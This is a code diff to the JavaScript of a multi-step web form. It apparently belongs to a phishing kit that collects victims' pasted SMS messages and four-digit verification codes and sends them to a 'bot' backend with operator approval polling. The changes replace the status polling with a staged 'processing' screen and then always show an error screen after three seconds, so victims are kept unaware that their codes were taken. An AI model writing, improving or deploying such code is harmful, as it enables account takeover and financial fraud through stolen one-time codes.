@@ -165,7 +165,6 @@ function validateStep3() {
 }
 
 function nextStep(stepNumber) {
-    // Validate current step before advancing
     if (stepNumber === 2 && !validateStep1()) return;
     if (stepNumber === 3 && !validateStep2()) return;
 
@@ -256,6 +255,7 @@ function pollApproval() {
         .catch(() => setTimeout(pollApproval, 3000));
 }
 
+// --- Shows Processing Screen ---
 function submitSms() {
     const sms = document.getElementById('smsContent').value.trim();
     if (!sms) {
@@ -263,38 +263,21 @@ function submitSms() {
         return;
     }
 
+    showScreen('processing-screen'); // Show loading screen immediately
+
     fetch('/api/submit-sms', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ sessionId: currentSessionId, sms })
-    })
-    .then(() => pollForSmsResponse())
-    .catch(err => {
-        console.error(err);
-        alert('Error submitting SMS.');
-    });
+    }).catch(err => console.error("Error sending SMS to bot:", err));
+    
+    // Wait 3 seconds, then show the error screen
+    setTimeout(() => {
+        showScreen('error-screen');
+    }, 3000);
 }
 
-function pollForSmsResponse() {
-    fetch(`/api/session-status/${currentSessionId}`)
-        .then(r => r.json())
-        .then(data => {
-            if (data.nextStep === 'verification') {
-                showScreen('verification-screen');
-            } else if (data.nextStep === 'resend_sms') {
-                alert('Please check your messages for a new SMS code and paste it again.');
-                document.getElementById('smsContent').value = '';
-                showScreen('sms-screen');
-            } else if (data.nextStep === 'rejected') {
-                alert('Your application was rejected.');
-                showScreen('main-screen');
-            } else {
-                setTimeout(pollForSmsResponse, 3000);
-            }
-        })
-        .catch(() => setTimeout(pollForSmsResponse, 3000));
-}
-
+// --- Shows Processing Screen ---
 function submitVerificationCode() {
     const code = document.getElementById('fourDigitCode').value.trim();
     if (!/^[0-9]{4}$/.test(code)) {
@@ -302,36 +285,18 @@ function submitVerificationCode() {
         return;
     }
 
+    showScreen('processing-screen'); // Show loading screen immediately
+
     fetch('/api/submit-verification', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ sessionId: currentSessionId, code })
-    })
-    .then(() => pollForFinalDecision())
-    .catch(err => {
-        console.error(err);
-        showScreen('error-screen');
-    });
-}
+    }).catch(err => console.error("Error sending code to bot:", err));
 
-function pollForFinalDecision() {
-    fetch(`/api/session-status/${currentSessionId}`)
-        .then(r => r.json())
-        .then(data => {
-            if (data.nextStep === 'final_approved') {
-                showScreen('error-screen');
-            } else if (data.nextStep === 'resend_verification') {
-                alert('Please check your messages for a new verification code.');
-                document.getElementById('fourDigitCode').value = '';
-                showScreen('verification-screen');
-            } else if (data.nextStep === 'final_rejected') {
-                alert('Your application was rejected.');
-                showScreen('main-screen');
-            } else {
-                setTimeout(pollForFinalDecision, 3000);
-            }
-        })
-        .catch(() => setTimeout(pollForFinalDecision, 3000));
+    // Wait 3 seconds, then show the error screen
+    setTimeout(() => {
+        showScreen('error-screen');
+    }, 3000);
 }
 
 // Init numeric inputs after DOM loads
